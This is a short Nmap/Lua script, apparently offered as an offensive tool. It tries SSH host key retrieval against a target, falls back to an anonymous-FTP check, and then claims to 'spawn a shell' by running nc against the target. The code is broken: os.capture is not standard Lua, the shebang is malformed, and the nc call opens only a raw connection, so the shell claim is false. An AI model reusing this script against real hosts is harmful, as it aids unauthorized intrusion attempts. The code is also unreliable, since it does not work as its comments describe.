/usr/bin/env nmap

--[[
This script attempts to retrieve the target host's SSH host key.
If the host key retrieval fails, it tries ftp-anon access.
If ftp-anon access is successful, it spawns a shell.
Developed By: SirCryptic (NullSecurityTeam)
~ Greetz To The World
]]

local target = arg[1]
local logfile = arg[2] or "nmap-script-log.txt"
local port = arg[3] or 21
local timeout = arg[4] or 5

prerule = function()
  io.write("Retrieving SSH host key...\n")
  local ssh_key = os.capture("nmap -p 22 --script ssh-hostkey -oN - " .. target)

  if string.match(ssh_key, "No exact match") then
    io.write("SSH host key retrieval failed, attempting ftp-anon access...\n")
    local ftp_access = os.capture("nmap -p 21 --script ftp-anon -oN - " .. target)

    if string.match(ftp_access, "anonymous access allowed") then
      io.write("ftp-anon access allowed, spawning shell...\n")
      local shell_output = os.capture("nc -w " .. timeout .. " " .. target .. " " .. port)
      local log_file = io.open(logfile, "a")
      log_file:write(shell_output)
      log_file:close()
    else
      io.write("ftp-anon access denied.\n")
    end
  else
    io.write("SSH host key retrieved.\n")
  end
end
